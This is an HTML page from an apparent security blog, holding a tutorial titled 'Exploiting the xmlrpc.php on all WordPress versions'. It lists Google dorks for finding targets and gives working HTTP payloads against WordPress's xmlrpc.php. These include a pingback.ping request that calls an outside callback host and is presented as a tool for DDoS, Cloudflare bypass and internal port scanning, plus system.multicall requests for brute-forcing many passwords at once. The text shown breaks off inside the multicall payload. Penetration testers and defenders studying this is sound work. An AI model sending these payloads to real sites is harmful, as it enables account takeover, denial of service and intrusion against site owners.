<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#424242"
    },
    "button": {
      "background": "#2a7ae2"
    }
  },
  "content": {
    "href": "/privacy-policy"
  }
})});
</script>
  
  
  
  <title>Exploiting the xmlrpc.php on all WordPress versions</title>
  <meta name="description" content="">
  
    
    <meta name="keywords" content="Lucian Nitescu, offensive security, wordpress, bypass, cloudflare, callback, pingback, methods, ddos, dos, bruteforce">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/">
  
  
  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
  <meta name="flattr:id" content="njnwdo">
  <!-- Hotjar Tracking Code for https://nitesculucian.github.io/ -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:1067531,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>

<script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
</script>


    
    
    
    	
    
    	
    		
    			
    			<meta property="og:image" content="https://nitesculucian.github.io/uploads/Screenshot from 2019-07-02 02-52-29.png" alt="XML RPC DDOS attack, port scanning, xmlrpc.php, wordpress" " />
    			<meta name="twitter:image" content="https://nitesculucian.github.io/uploads/Screenshot from 2019-07-02 02-52-29.png" alt="XML RPC DDOS attack, port scanning, xmlrpc.php, wordpress" " />
    			
    		
        
    
    	
    		
        
    


  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:title" content="Exploiting the xmlrpc.php on all WordPress versions">
  <meta name="twitter:description" content="">
  
  
  
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">

  
  <!-- Google Analytics -->
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-107695141-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Lucian Nitescu</a>

    <nav class="site-nav">
      
        
        <a class="page-link" href="/">Home</a>
      
        
        <a class="page-link" href="/about/">Whoami</a>
      
        
        <a class="page-link" href="/archives/">Archives</a>
      
    </nav>
    <br>Security Blog
  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    
    <h1 class="post-title" itemprop="name headline">Exploiting the xmlrpc.php on all WordPress versions</h1>
    
    <p class="post-meta"><time datetime="2019-07-01T20:37:00-03:00" itemprop="datePublished">Jul 1, 2019</time> •
  
    
    
      
    
      
    
      
        <a href="/categories/cheatsheet/">cheatsheet</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
        <a href="/categories/offensive-security/">offensive_security</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/wordpress/">wordpress</a>
      
    
  



</p>
  </header>

  <hr>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <!-- all pages -->
  <ins class="adsbygoogle"
  style="display:block"
  data-ad-client="ca-pub-0255642880549652"
  data-ad-slot="6220756861"
  data-ad-format="auto"
  data-full-width-responsive="true"></ins>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
  </script>

  <hr>

  <div class="post-content" itemprop="articleBody" style="word-wrap:break-word">
    <p><img src="/uploads/Screenshot from 2019-07-02 02-52-29.png" alt="XML RPC DDOS attack, port scanning, xmlrpc.php, wordpress" /></p>

<p><a href="https://codex.wordpress.org/XML-RPC_Support">XML-RPC</a> on WordPress is actually an API that allows developers who make 3rd party application and services the ability to interact to your WordPress site. The XML-RPC API that WordPress provides several key functionalities that include:</p>

<ul>
  <li>Publish a post</li>
  <li>Edit a post</li>
  <li>Delete a post.</li>
  <li>Upload a new file (e.g. an image for a post)</li>
  <li>Get a list of comments</li>
  <li>Edit comments</li>
</ul>

<p>For instance, the Windows Live Writer system is capable of posting blogs directly to WordPress because of XML-RPC.</p>

<p>Unfortunately on the normal installation (not tampered with settings, and/or configs) of WordPress the XML-RPC interface opens two kinds of attacks:</p>

<ul>
  <li><strong>XML-RPC pingbacks</strong></li>
  <li><strong>Brute force attacks via XML-RPC</strong></li>
</ul>

<p>According to the WordPress documentation (<a href="https://codex.wordpress.org/XML-RPC_Support">https://codex.wordpress.org/XML-RPC_Support</a>), XML-RPC functionality is turned on by default since WordPress 3.5.</p>

<p>Note that in this tutorial/cheatsheet the domain “example.com” is actually an example and can be replaced with your specific target.</p>

<h2 id="dorks-for-finding-potential-targets">Dorks for finding potential targets</h2>
<p>I would like to add that <strong>any illegal action is your own</strong>, and I can not be held responsible for your actions against a vulnerable target. Test only where you are allowed to do so. Go for the public, known bug bounties and earn your respect within the community.</p>

<p>That’s being said, during bug bounties or penetration testing assessments I had to identify all vulnerable WordPress targets on all subdomains following the rule <code class="highlighter-rouge">*.example.com</code>.  In this specific case I relied on Google dorks in order to fast discovery all potential targets:</p>

<ul>
  <li><code class="highlighter-rouge">inurl:"/xmlrpc.php?rsd"</code> + scoping restrictions</li>
  <li><code class="highlighter-rouge">intitle:"WordPress" inurl:"readme.html"</code> + scoping restrictions = general wordpress detection</li>
  <li><code class="highlighter-rouge">allinurl:"wp-content/plugins/"</code> + scoping restrictions = general wordpress detection</li>
</ul>

<h2 id="searching-for-xml-rpc-servers-on-wordpress">Searching for XML-RPC servers on WordPress:</h2>

<p>Steps to check:</p>

<ol>
  <li>Ensure you are targeting a WordPress site.</li>
  <li>Ensure you have access to the <code class="highlighter-rouge">xmlrpc.php</code> file. In general, it is found at https://example.com/xmlrpc.php and would reply to a GET request with: <code class="highlighter-rouge">XML-RPC server accepts POST requests only.</code></li>
  <li>It will be pointless to target an XML-RPC server which is disabled/hardcoded/tampered/not working. Therefore, we will check its functionality by sending the following request:</li>
</ol>

<p>Post Request:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> 
<span class="nt">&lt;methodCall&gt;</span> 
<span class="nt">&lt;methodName&gt;</span>system.listMethods<span class="nt">&lt;/methodName&gt;</span> 
<span class="nt">&lt;params&gt;&lt;/params&gt;</span> 
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div></div>

<p>The normal response should be:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 17:13:30 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 4272
Content-Type: text/xml; charset=UTF-8

<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;methodResponse&gt;</span>
  <span class="nt">&lt;params&gt;</span>
    <span class="nt">&lt;param&gt;</span>
      <span class="nt">&lt;value&gt;</span>
      <span class="nt">&lt;array&gt;&lt;data&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>system.multicall<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>system.listMethods<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>system.getCapabilities<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>demo.addTwoNumbers<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>demo.sayHello<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>pingback.extensions.getPingbacks<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>pingback.ping<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.publishPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.getTrackbackPings<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.supportedTextFilters<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.supportedMethods<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.setPostCategories<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.getPostCategories<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.getRecentPostTitles<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>mt.getCategoryList<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.deletePost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.newMediaObject<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.getCategories<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.getRecentPosts<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.getPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.editPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>metaWeblog.newPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>blogger.deletePost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>blogger.editPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>blogger.newPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>blogger.getRecentPosts<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>blogger.getPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>blogger.getUserInfo<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>blogger.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.restoreRevision<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getRevisions<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPostTypes<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPostType<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPostFormats<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getMediaLibrary<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getMediaItem<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getCommentStatusList<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.newComment<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.editComment<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.deleteComment<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getComments<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getComment<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.setOptions<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getOptions<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPageTemplates<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPageStatusList<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPostStatusList<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getCommentCount<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.deleteFile<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.uploadFile<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.suggestCategories<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.deleteCategory<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.newCategory<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getTags<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getCategories<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getAuthors<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPageList<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.editPage<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.deletePage<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.newPage<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPages<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPage<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.editProfile<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getProfile<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getUsers<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getUser<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getTaxonomies<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getTaxonomy<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getTerms<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getTerm<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.deleteTerm<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.editTerm<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.newTerm<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPosts<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.deletePost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.editPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.newPost<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
<span class="nt">&lt;/data&gt;&lt;/array&gt;</span>
      <span class="nt">&lt;/value&gt;</span>
    <span class="nt">&lt;/param&gt;</span>
  <span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodResponse&gt;</span>
</code></pre></div></div>

<p>Note that in the absence of the above-presented example response, it is rather pointless to proceed with actual testing of the two vulnerabilities. The response might vary based on the settings and configurations of the WordPress installation.</p>

<ol>
  <li>If there is an output for <code class="highlighter-rouge">&lt;methodName&gt;system.listMethods&lt;/methodName&gt;</code> then it is recommended to interact with at least the most basic method called <strong>demo.sayHello</strong>.</li>
</ol>

<p>Request:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 130

<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> 
<span class="nt">&lt;methodCall&gt;</span> 
<span class="nt">&lt;methodName&gt;</span>demo.sayHello<span class="nt">&lt;/methodName&gt;</span> 
<span class="nt">&lt;params&gt;&lt;/params&gt;</span> 
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div></div>

<p>Response:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 17:19:05 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 181
Content-Type: text/xml; charset=UTF-8

<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;methodResponse&gt;</span>
  <span class="nt">&lt;params&gt;</span>
    <span class="nt">&lt;param&gt;</span>
      <span class="nt">&lt;value&gt;</span>
      <span class="nt">&lt;string&gt;</span>Hello!<span class="nt">&lt;/string&gt;</span>
      <span class="nt">&lt;/value&gt;</span>
    <span class="nt">&lt;/param&gt;</span>
  <span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodResponse&gt;</span>
</code></pre></div></div>

<h2 id="xml-rpc-pingbacks-attacks">XML-RPC pingbacks attacks</h2>

<p>In this case, an attacker is able to leverage the default <strong>XML-RPC API</strong> in order to perform callbacks for the following purposes:</p>

<ol>
  <li><strong>Distributed denial-of-service (DDoS) attacks</strong> - An attacker executes the <strong>pingback.ping</strong> the method from several affected WordPress installations against a single unprotected target (botnet level).</li>
  <li><strong>Cloudflare Protection Bypass</strong> - An attacker executes the <strong>pingback.ping</strong> the method from a single affected WordPress installation which is protected by CloudFlare to an attacker-controlled public host (for example a VPS) in order to reveal the public IP of the target, therefore bypassing any DNS level protection.</li>
  <li><strong>XSPA (Cross Site Port Attack)</strong> - An attacker can execute the <strong>pingback.ping</strong> the method from a single affected WordPress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.</li>
</ol>

<p>The following represents an simple example request using the <a href="https://postb.in/">PostBin</a> provided URL as callback:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 303

<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;methodCall&gt;</span>
<span class="nt">&lt;methodName&gt;</span>pingback.ping<span class="nt">&lt;/methodName&gt;</span>
<span class="nt">&lt;params&gt;</span>
<span class="nt">&lt;param&gt;</span>
<span class="nt">&lt;value&gt;&lt;string&gt;</span>https://postb.in/1562017983221-4377199190203<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
<span class="nt">&lt;/param&gt;</span>
<span class="nt">&lt;param&gt;</span>
<span class="nt">&lt;value&gt;&lt;string&gt;</span>https://example.com/<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
<span class="nt">&lt;/param&gt;</span>
<span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div></div>

<p>Example response:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 21:53:56 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 370
Content-Type: text/xml; charset=UTF-8

<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;methodResponse&gt;</span>
  <span class="nt">&lt;fault&gt;</span>
    <span class="nt">&lt;value&gt;</span>
      <span class="nt">&lt;struct&gt;</span>
        <span class="nt">&lt;member&gt;</span>
          <span class="nt">&lt;name&gt;</span>faultCode<span class="nt">&lt;/name&gt;</span>
          <span class="nt">&lt;value&gt;&lt;int&gt;</span>0<span class="nt">&lt;/int&gt;&lt;/value&gt;</span>
        <span class="nt">&lt;/member&gt;</span>
        <span class="nt">&lt;member&gt;</span>
          <span class="nt">&lt;name&gt;</span>faultString<span class="nt">&lt;/name&gt;</span>
          <span class="nt">&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;</span>
        <span class="nt">&lt;/member&gt;</span>
      <span class="nt">&lt;/struct&gt;</span>
    <span class="nt">&lt;/value&gt;</span>
  <span class="nt">&lt;/fault&gt;</span>
<span class="nt">&lt;/methodResponse&gt;</span>
</code></pre></div></div>
<p>PostBin Output:</p>

<p><img src="/uploads/Screenshot from 2019-07-02 01-03-07.png" alt="XML RPC DDOS attack, port scanning, xmlrpc.php, wordpress" /></p>

<h2 id="brute-force-attacks">Brute force attacks</h2>

<p>Sometimes the only way to bypass request limiting or blocking in a brute force attack against WordPress site is to use the all too forgotten <strong>XML-RPC API</strong>.</p>

<p>The following request represents the most common brute force attack:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;methodCall&gt;</span> 
<span class="nt">&lt;methodName&gt;</span>wp.getUsersBlogs<span class="nt">&lt;/methodName&gt;</span> 
<span class="nt">&lt;params&gt;</span> 
<span class="nt">&lt;param&gt;&lt;value&gt;</span>\{\{your username\}\}<span class="nt">&lt;/value&gt;&lt;/param&gt;</span> 
<span class="nt">&lt;param&gt;&lt;value&gt;</span>\{\{your password\}\}<span class="nt">&lt;/value&gt;&lt;/param&gt;</span> 
<span class="nt">&lt;/params&gt;</span> 
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div></div>
<p>The above request can be sent in Burp Intruder (for example) with different sets of credentials. Note that, even if you guess the password or not, <strong>the response code will always be 200</strong>. I highly recommend looking for errors/messages within the body of the response.</p>

<p><strong>Worried about sending way to much requests against the target?</strong> - No worries. WordPress XML-RPC by default allows an attacker to perform a single request, and brute force hundreds of passwords.</p>

<p>The following request requires permissions for both <strong>system.multicall</strong> and  <strong>wp.getUsersBlogs</strong> methods:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 1560

<span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="nt">&lt;methodCall&gt;&lt;methodName&gt;</span>system.multicall<span class="nt">&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;</span>

<span class="nt">&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;</span>methodName<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>wp.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;</span>params<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Username \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Password \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;</span>

<span class="nt">&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;</span>methodName<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>wp.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;</span>params<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Username \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Password \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;</span>

<span class="nt">&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;</span>methodName<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>wp.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;</span>params<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Username \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Password \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;</span>

